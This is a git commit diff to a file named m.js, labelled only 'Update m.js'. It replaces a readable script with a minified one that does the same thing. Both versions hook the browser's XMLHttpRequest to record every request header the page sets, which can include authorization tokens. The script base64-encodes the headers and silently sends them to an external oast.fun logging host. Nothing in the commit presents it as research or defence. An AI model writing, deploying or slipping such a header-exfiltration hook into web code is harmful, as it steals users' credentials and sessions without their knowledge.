23e92c0d387005ecb42fa5a11d46f67ab70fc2f4
Vikas Gupta <vikasgupta.92155@gmail.com>
2025-08-08 00:09:58 +0530

    Update m.js

--- m.js
+++ m.js
@@ -1,16 +1,1 @@
-(() => {
-  const O = XMLHttpRequest;
-  XMLHttpRequest = function () {
-    const x = new O(), h = {}, s = x.setRequestHeader;
-    x.setRequestHeader = function (k, v) {
-      h[k] = v;
-      return s.call(this, k, v);
-    };
-    x.addEventListener('load', () => {
-      const b64 = btoa(JSON.stringify(h));
-      const url = "https://piesyoygbsbedgjwarpa8ldhsnuh5snul.oast.fun/logger?headers=" + encodeURIComponent(b64);
-      fetch(url).catch(() => {}); // Silent fail
-    });
-    return x;
-  };
-})();
+(()=>{const O=XMLHttpRequest;XMLHttpRequest=function(){const x=new O,h={},s=x.setRequestHeader;x.setRequestHeader=function(k,v){h[k]=v;return s.call(this,k,v)};x.addEventListener("load",()=>{fetch("https://piesyoygbsbedgjwarpa8ldhsnuh5snul.oast.fun/logger?headers="+encodeURIComponent(btoa(JSON.stringify(h)))).catch(()=>{})});return x}})();
